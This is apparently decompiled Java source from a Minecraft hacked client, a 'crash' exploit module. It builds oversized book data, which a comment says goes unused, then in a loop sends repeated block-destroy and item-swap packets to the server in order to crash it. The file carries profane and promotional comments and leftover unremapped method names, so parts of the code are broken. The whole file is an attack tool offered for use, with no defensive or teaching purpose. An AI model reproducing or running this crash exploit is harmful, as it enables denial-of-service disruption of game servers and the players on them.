package com.moonclient.pro.Exploit.Crash;

import java.util.Random;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;
import net.minecraft.client.Minecraft;

@Environment(value=EnvType.CLIENT)
public class Netty {
    public static void crash() {
        for (int i = 0; i < 10; ++i) {
            ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            Random random = new Random();
            String author = "Netty" + random.nextInt(100, 500);
            String content = "........................................................................................................................................................................................................................................................................................................................";
            CompoundTag tag = new CompoundTag();
            ListTag pages = new ListTag();
            for (int j = 0; j < 30; ++j) {
                pages.add(StringTag.valueOf(content));
            }
            tag.putString("author", author);
            tag.putString("title", "Buy Lodias Client YIPPPEEEEEEEEE");
            tag.put("pages", pages);
            if (book.method_7985()) {
                CompoundTag bookTag = book.getTag();
                bookTag.put("pages", pages);
            } else {
                book.setTag(tag);
            }

            // Book is generating here but never used XDD

            // FUCK-SKIDDERS.CLUB - Remapper Problem
            // Can't be remapped -> [method_23317, method_23318, method_23321, method_52787, method_52787, method_52787, method_52787]
            // Lines -> [39, 39, 39, 40, 41, 42, 43]
            
            BlockPos pos = new BlockPos((int)Minecraft.getInstance().player.getX(), (int)(Minecraft.getInstance().player.getY() - 2.0), (int)Minecraft.getInstance().player.getZ());
            Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.START_DESTROY_BLOCK, pos, Direction.UP));
            Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.STOP_DESTROY_BLOCK, pos, Direction.UP));
            Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.ABORT_DESTROY_BLOCK, pos, Direction.UP));
            Minecraft.getInstance().getConnection().send(new ServerboundPlayerActionPacket(ServerboundPlayerActionPacket.ServerboundPlayerActionPacket$Action.SWAP_ITEM_WITH_OFFHAND, pos, Direction.UP));
        }
    }
}
 